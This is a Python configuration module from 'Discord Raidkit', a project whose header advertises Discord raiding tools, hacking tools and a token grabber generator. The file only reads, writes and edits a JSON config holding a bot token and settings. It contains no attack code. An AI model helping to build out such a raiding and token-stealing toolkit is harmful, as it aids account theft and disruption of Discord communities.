'''
Discord Raidkit v2.3.0 — "The trojan horse of discord raiding" 
Copyright © 2022 the-cult-of-integral

a collection of raiding tools, hacking tools, and a token grabber generator for discord; written in Python 3

This program is under the GNU General Public License v2.0.
https://github.com/the-cult-of-integral/discord-raidkit/blob/master/LICENSE

config.py contains the DRConfig class, which handles the configuration aspect of Discord Raidkit.
config.py was last updated on 11/08/22 at 13:36.
'''

import json
import logging
import os

from display import show_cfg_screen
from utils import mkfile

logging.basicConfig(level=logging.INFO, format=' %(asctime)s - %(levelname)s - %(message)s',
                    filename='raidkit.log', filemode='a+', datefmt='%d/%m/%Y %H:%M:%S')

DEFAULT_CFG = {
    "token": "",
    "app_id": "",
    "prefix": "",
    "statuses": [""],
    "theme": "default",
    "verbose": False
}


class DRConfig:
    """A class to read and write the Discord Raidkit config file.

    The config file is a JSON file that contains the following keys:
        token: the bot token
        app_id: the application id
        prefix: the bot prefix

    When initializing this class, provide the path to the config file.
    If the path does not exist, it will be made automatically.
    """

    def __init__(self, cfg_filepath: str):
        self.cfg_filepath = cfg_filepath
        self.config = self.read_config()

    def check_cfg_path(func):
        """A decorator that will create a new config file if the file does not exist.
        """
        def wrapper(ref):
            if not os.path.exists(ref.cfg_filepath):
                logging.info(f'{ref.cfg_filepath} does not exist. Creating...')
                mkfile(ref.cfg_filepath, json.dumps(DEFAULT_CFG, indent=4))
            return func(ref)
        return wrapper

    @check_cfg_path
    def read_config(self) -> dict:
        with open(self.cfg_filepath, 'r') as f:
            return json.load(f)

    @check_cfg_path
    def write_config(self) -> bool:
        try:
            with open(self.cfg_filepath, 'w') as f:
                json.dump(self.config, f, indent=4)
            return True
        except Exception as e:
            logging.error(f'Error in config.py - write_config(): {e}')
            return False

    @check_cfg_path
    def check_cfg_set(self) -> bool:
        a = self.config["token"]
        b = self.config["app_id"]
        c = self.config["prefix"]
        d = all(s for s in self.config["statuses"])
        e = self.config["theme"]
        f = str(self.config["verbose"])
        if a and b and c and d and e and f:
            return True
        return False

    def set_cfg(self) -> bool:
        """The method for the user to set the config via a UI.
        """
        try:
            opt = '0'

            while (opt != '6' and opt != '7'):
                show_cfg_screen(self.config)
                opt = input('Enter a number to select an option: ')
                if opt == '1':
                    self.config["token"] = input('Enter the bot token: ')
                    if not self.write_config():
                        return False
                elif opt == '2':
                    self.config["app_id"] = input('Enter the application id: ')
                    if not self.write_config():
                        return False
                elif opt == '3':
                    self.config["prefix"] = input('Enter the bot prefix: ')
                    if not self.write_config():
                        return False
                elif opt == '4':
                    self.config["statuses"] = input(
                        'Enter the statuses separated by commas: ').split(',')
                    if not self.write_config():
                        return False
                elif opt == '5':
                    temp = input('Enter true (1) or false (0): ').lower()
                    if temp == 'true' or temp == '1':
                        self.config["verbose"] = True
                    elif temp == 'false' or temp == '0':
                        self.config["verbose"] = False
                    else:
                        continue
                    if not self.write_config():
                        return False
                elif opt == '6':
                    if not self.check_cfg_set():
                        opt = '0'
                    continue
                elif opt == '7':
                    return False
                else:
                    continue

            os.system('cls' if os.name == 'nt' else 'clear')
            return True
        except Exception as e:
            logging.error(f'Error in config.py - set_cfg(): {e}')
            return False

    def __getitem__(self, key: str) -> str:
        if self.config["verbose"]:
            logging.info(f'[verbose] Getting {key} from config.py')
        return self.config[key]

    def __setitem__(self, key: str, value: str) -> bool:
        if self.config["verbose"]:
            logging.info(f'[verbose] Setting {key} to {value} in config.py')
        self.config[key] = value
        return self.write_config()
